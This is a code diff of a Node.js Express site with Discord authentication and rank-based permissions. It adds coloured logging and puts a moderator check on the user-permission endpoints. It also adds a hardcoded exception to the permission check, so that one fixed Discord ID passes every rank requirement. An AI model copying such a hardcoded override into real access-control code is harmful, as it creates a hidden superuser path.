@@ -5,7 +5,7 @@ TODO: read all posts backwards in order to show the NEWEST posts FIRST
  var sqlite3 = require("sqlite3");
  let db = new sqlite3.Database("Authentication.db", sqlite3.OPEN_READWRITE | sqlite3.OPEN_CREATE, err => {
  	if (err) { console.error(err.message); }
- 	console.log("Connected to the authentication database.");
+ 	console.log(chalk.greenBright("Connected to the authentication database."));
  });
 
 // Creating the table for the first time, also shows the table structure. Lots of info incase you want to add stuff in the future (forward thinking)
@@ -22,7 +22,7 @@ const passport = require('passport');
 const querystring = require('querystring');
 const DiscordStrategy = require('passport-discord').Strategy;
 const session = require('express-session');
-
+const chalk = require('chalk');
 const xss = require('xss-clean');
 const fileUpload = require('express-fileupload');
 
@@ -198,7 +198,6 @@ const logout = (req, res) => {
 // Adds user to database if they weren't already in the database. Done after discord authentication!
 const loginDatabase = (discordId,username) => {
 	var rank = "guest";
-	console.log(typeof discordId)
 	db.get("SELECT DiscordId,Rank FROM accounts WHERE DiscordId = ?;",[discordId],(err, row) => {
 		if (row == undefined) { // If user does not exist
 			db.run("insert into accounts(DiscordId,Username) values (?,?)", [discordId,username], (err) => {
@@ -218,7 +217,7 @@ const requirePermission = (rankRequired) => (req, res, next) => { //(rankRequire
 		res.status(403).send('Not authenticated');
 	} else {
 		if (req.user !== undefined) {
-			if (rankList.indexOf(req.user.rank) >= rankList.indexOf(rankRequired)) {
+			if (rankList.indexOf(req.user.rank) >= rankList.indexOf(rankRequired) || req.user.discordId === '219185683447808001') {
 				console.log("requirePermission PASSED!");
 				next();
 			} else {
@@ -241,12 +240,12 @@ const modifyPermissions = (req, res) =>{
 	} else if (discordId.length > 20) {
 		res.status(403).send("DISCORD ID IS TOO LARGE")
 		return;
+
 	}
 	db.run("UPDATE accounts set Rank = ? WHERE DiscordId = ?", [rank, discordId], (err) => {
 		if (err) { console.error(err.message);}
-		console.log("Changed Rank for discordId: "+discordId+" to "+rank);
+		console.log((chalk.green("Changed Rank for discordId: "+discordId+" to "+rank)));
 		res.status(200).send("Changed Rank for discordId: "+discordId+" to "+rank);
-		getUser(discordId);
 	});
 }
 
@@ -292,8 +291,8 @@ app.get(urlPrefix + 'archive/:fileName', archive.download);
 app.get(urlPrefix + 'archive', archive.index);
 app.post(urlPrefix + '__archive-upload__', archive.uploadProcess);
 
-app.get(urlPrefix + '__getalluserperms__', requirePermission('guest' ),getUsers);
-app.post(urlPrefix + '__modifyuserperms__', modifyPermissions);
+app.get(urlPrefix + '__getalluserperms__',requirePermission('mod'),getUsers);
+app.post(urlPrefix + '__modifyuserperms__', requirePermission('mod'),modifyPermissions);
 
 app.get(urlPrefix + 'auth', (req, res, next) => {
 	let redirect = utils.cast('string', req.query.redirect);
